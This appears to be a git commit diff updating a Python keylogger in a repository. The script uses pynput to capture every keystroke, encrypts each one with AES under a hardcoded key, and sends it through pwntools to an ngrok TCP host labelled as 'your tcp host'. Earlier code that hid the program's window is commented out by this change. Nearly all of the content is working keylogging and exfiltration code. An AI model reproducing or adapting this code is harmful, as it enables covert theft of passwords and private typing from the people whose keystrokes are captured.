f3a5d8c1d44f1321c923a46c29f2f35d1f08c87e
Federico <73756451+Gifelaga@users.noreply.github.com>
2023-10-04 21:40:11 +0200

    Update Keylogger.py

--- Keylogger.py
+++ Keylogger.py
@@ -2,16 +2,24 @@ from pwn import *
 from pynput import keyboard
 import win32gui
 import win32con
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
 
-hwnd = win32gui.GetForegroundWindow()
-win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+super_secret_key = b'super_secret_key'
+cipher = AES.new(super_secret_key, AES.MODE_ECB)
 
-c = remote('127.0.0.1', 6969)
+HOST = '0.tcp.eu.ngrok.io' # Your tcp host
+PORT = 1234 # Your tcp open port
+
+'''hwnd = win32gui.GetForegroundWindow()
+win32gui.ShowWindow(hwnd, win32con.SW_HIDE)'''
+
+c = remote(HOST, PORT)
 
 def keyPressed(key):
     try:
         char = key.char
-        c.sendline(char)
+        c.sendline(cipher.encrypt(pad(char.encode(), 16)))
     except:
         pass
 
